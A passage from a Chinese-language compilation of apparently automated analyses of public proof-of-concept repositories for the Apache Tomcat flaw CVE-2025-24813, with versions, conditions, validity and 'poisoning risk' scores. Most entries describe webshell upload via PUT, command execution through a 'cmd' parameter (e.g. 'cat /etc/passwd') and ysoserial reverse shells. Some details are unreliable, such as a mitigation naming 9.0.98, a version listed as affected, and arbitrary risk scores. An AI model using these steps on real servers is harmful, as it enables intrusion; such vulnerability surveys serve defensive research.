*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

